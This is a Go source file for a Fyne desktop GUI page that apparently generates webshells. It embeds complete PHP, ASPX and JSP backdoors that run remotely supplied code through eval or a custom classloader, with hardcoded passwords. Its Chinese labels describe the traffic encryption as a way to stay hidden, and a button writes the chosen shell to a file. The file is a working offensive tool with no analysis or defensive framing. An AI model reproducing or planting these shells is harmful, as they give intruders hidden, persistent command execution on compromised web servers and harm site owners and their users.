package main

import (
	"fmt"
	"fyne.io/fyne/v2"
	"fyne.io/fyne/v2/container"
	"fyne.io/fyne/v2/dialog"
	"fyne.io/fyne/v2/widget"
	"os"
	"strings"
)

func showWebshellGenerationPage2(w fyne.Window) *fyne.Container {
	title := widget.NewLabel("选择你的流量加密木马类型")

	var immortalCheckBox *widget.Check

	var selectedType string

	infoContent := widget.NewMultiLineEntry()
	infoContent.SetPlaceHolder("这里会显示相关信息...")
	infoLabel := widget.NewLabel("")

	selectType := widget.NewSelect([]string{"PHP+", "ASPX+", "JSP+"}, func(selected string) {
		selectedType = selected
		switch selected {
		case "PHP+":
			infoLabel.SetText("AES对称式流量加密的木马文件，客户端通过发送get请求获取随机生成的key，发送post请求执行加密后的代码，使流量无法被解密，便于隐藏")
			infoContent.SetText(`<?php
error_reporting(0);
session_start();
if (!function_exists('random_bytes')) {
    function random_bytes($length) {
        $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
        $charactersLength = strlen($characters);
        $randomString = '';
        for ($i = 0; $i < $length; $i++) {
            $randomString .= $characters[rand(0, $charactersLength - 1)];
        }
        return $randomString;
    }
}

if (isset($_GET['pass'])) {	
    $pass = $_GET['pass'];
    $hash = md5($pass);
    $hash16 = substr($hash, 0, 16);
    if ($hash16 == "e9ad85f19bd42159"){  //密码默认为anchovy
        $randomString = bin2hex(random_bytes(8));
        $md5Hash = md5($randomString);
        $key = substr($md5Hash, 0, 16);
        $_SESSION['key'] = $key;
        echo $key;
        exit;
    }
}

if (!isset($_GET['pass'])) {
    $post = file_get_contents("php://input");
    $key = $_SESSION['key'];
    if (!extension_loaded('openssl')) {
        $t = "base64_" . "decode";
        $post = $t($post."");
        for($i = 0; $i < strlen($post); $i++) {
            $post[$i] = $post[$i] ^ $key[$i + 1 & 15]; 
        }
    } else {
        $post = openssl_decrypt($post, "AES-128-ECB", $key);
    }
    $arr = explode('|', $post);
    $func = $arr[0];
    $params = $arr[1];
    class C {public function __invoke($p) {eval($p."");}}
    @call_user_func(new C(), $params);
}
?>
`)
			immortalCheckBox.Show()
		case "ASPX+":
			infoLabel.SetText("AES对称式流量加密的木马文件，客户端通过发送get请求获取随机生成的key，发送post请求执行加密后的代码，使流量无法被解密，便于隐藏")
			infoContent.SetText(`<%@ Page Language="Jscript" Debug="true"%>
<%@ Import Namespace="System" %>
<%@ Import Namespace="System.Security.Cryptography" %>
<%@ Import Namespace="System.Text" %>

<%
    function generateRandomKey() {
        var chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        var key = "";
        for (var i = 0; i < 16; i++) {
            var randomIndex = Math.floor(Math.random() * chars.length);
            key += chars.charAt(randomIndex);
        }
        return key;
    }

    function decryptAES(cipherText, key) {
        try {
            var aes = Aes.Create();
            aes.Key = Encoding.UTF8.GetBytes(key);
            aes.Mode = CipherMode.ECB;
            aes.Padding = PaddingMode.PKCS7;

            var decryptor = aes.CreateDecryptor(aes.Key, null);
            var cipherBytes = Convert.FromBase64String(cipherText);
            var plainTextBytes = decryptor.TransformFinalBlock(cipherBytes, 0, cipherBytes.Length);

            return Encoding.UTF8.GetString(plainTextBytes);
        } catch (e) {
            return "Decryption error: " + e.message;
        }
    }

    if (Request.HttpMethod == "GET" && Request.QueryString["pass"] == "ancho") {     //密码默认为ancho
        var key = generateRandomKey();
        Session["k"] = key;
        Response.Write(Session["k"]);
    } else if (Request.HttpMethod == "POST") {
        var cipherText = Request.Form["a"];
        var key = Session["k"];
        if (key != null && cipherText != null) {
            var decryptedText = decryptAES(cipherText, key);
            try {
                var result = eval(decryptedText);
                Response.Write(result);
            } catch (e) {
                Response.Write(decryptedText);
            }
        } else {
        }
    } else {
        Response.Write("Invalid request.");
    }
%>
`)
			immortalCheckBox.Hide()
		case "JSP+":
			infoLabel.SetText("利用PHP的特性，木马文件通过POST内容加载base64加密后的二进制文件来执行相关的代码，同时GET执行相关命令，由于解密后是二进制流，所以难以被破解")
			infoContent.SetText(`<%!
    class U extends ClassLoader {
        U(ClassLoader c) {
            super(c);
        }
        public Class g(byte[] b) {
            return super.defineClass(b, 0, b.length);
        }
    }

    public byte[] base64Decode(String str) throws Exception {
        try {
            Class clazz = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
        } catch (Exception e) {
            Class clazz = Class.forName("java.util.Base64");
            Object decoder = clazz.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
        }
    }
%>
<%
    String cls = request.getParameter("ancho"); //密码默认为ancho
    if (cls != null) {
        new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);
    }
%>
`)
			immortalCheckBox.Hide()
		default:
			infoContent.SetText("")
			immortalCheckBox.Hide()
		}
	})

	performButton := widget.NewButton("执行操作", func() {
		var message string
		switch selectedType {
		case "PHP+":
			message = "执行 PHP 相关操作"
			if immortalCheckBox.Checked {
				message += ""
			}
		case "ASPX+":
			message = "执行 ASPX 相关操作"
		case "JSP+":
			message = "执行 JSP 相关操作"
		default:
			message = "请选择一个类型"
		}

		selectedType2 := strings.ReplaceAll(selectedType, "+", "")
		selectedType3 := strings.ReplaceAll(selectedType, "+", "E")

		file, err := os.Create(fmt.Sprintf("%s_shell.%s", selectedType3, strings.ToLower(selectedType2)))
		if err != nil {
			dialog.ShowError(err, w)
			return
		}
		defer file.Close()

		_, err = file.WriteString(infoContent.Text)
		if err != nil {
			dialog.ShowError(err, w)
			return
		}

		message2 := fmt.Sprintf("内容已保存到文件 %s_shell.%s", selectedType3, strings.ToLower(selectedType2))
		dialog.ShowInformation("操作结果", message+message2, w)
	})

	immortalCheckBox = widget.NewCheck("Type 2", func(checked bool) {
		if checked {
			infoLabel.SetText("key现在为固定的key，免去了生成随机密钥的过程，客户端依然通过发送get请求获取key，post请求来执行代码")
			infoContent.SetText(`<?php
error_reporting(0);
if (isset($_GET['pass'])) {	
    $pass = $_GET['pass'];
    $hash = md5($pass);
    $hash16 = substr($hash, 0, 16);
    if ($hash16 == "e9ad85f19bd42159"){ //密码默认为anchovy
        $key = "e9ad85f19bd42159";
        echo $key;
        exit;
    }
}

if (!isset($_GET['pass'])) {
    $post = file_get_contents("php://input");
    $key = "e9ad85f19bd42159";

    if (!extension_loaded('openssl')) {
        $t = "base64_" . "decode";
        $post = $t($post."");
        for($i = 0; $i < strlen($post); $i++) {
            $post[$i] = $post[$i] ^ $key[$i + 1 & 15]; 
        }
    } else {
        $post = openssl_decrypt($post, "AES-128-ECB", $key);
    }
    $arr = explode('|', $post);
    $func = $arr[0];
    $params = $arr[1];
    class C {public function __invoke($p) {eval($p."");}}
    @call_user_func(new C(), $params);
}
?>
`)
		} else {
			infoLabel.SetText("AES对称式流量加密的木马文件，客户端通过发送get请求获取随机生成的key，发送post请求执行加密后的代码，使流量无法被解密，便于隐藏")
			infoContent.SetText(`<?php
error_reporting(0);
session_start();
if (!function_exists('random_bytes')) {
    function random_bytes($length) {
        $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
        $charactersLength = strlen($characters);
        $randomString = '';
        for ($i = 0; $i < $length; $i++) {
            $randomString .= $characters[rand(0, $charactersLength - 1)];
        }
        return $randomString;
    }
}

if (isset($_GET['pass'])) {	
    $pass = $_GET['pass'];
    $hash = md5($pass);
    $hash16 = substr($hash, 0, 16);
    if ($hash16 == "e9ad85f19bd42159"){  //密码默认为anchovy
        $randomString = bin2hex(random_bytes(8));
        $md5Hash = md5($randomString);
        $key = substr($md5Hash, 0, 16);
        $_SESSION['key'] = $key;
        echo $key;
        exit;
    }
}

if (!isset($_GET['pass'])) {
    $post = file_get_contents("php://input");
    $key = $_SESSION['key'];
    if (!extension_loaded('openssl')) {
        $t = "base64_" . "decode";
        $post = $t($post."");
        for($i = 0; $i < strlen($post); $i++) {
            $post[$i] = $post[$i] ^ $key[$i + 1 & 15]; 
        }
    } else {
        $post = openssl_decrypt($post, "AES-128-ECB", $key);
    }
    $arr = explode('|', $post);
    $func = $arr[0];
    $params = $arr[1];
    class C {public function __invoke($p) {eval($p."");}}
    @call_user_func(new C(), $params);
}
?>
`)
		}
	})
	immortalCheckBox.Hide()

	backButton := widget.NewButton("返回主页", func() {
		w.SetContent(firstPage())
	})

	scrollContainer := container.NewVScroll(infoContent)
	scrollContainer.SetMinSize(fyne.NewSize(400, 300))

	content := container.NewVBox(
		title,
		selectType,
		infoLabel,
		immortalCheckBox,
		scrollContainer,
		performButton,
		backButton,
	)

	return content
}
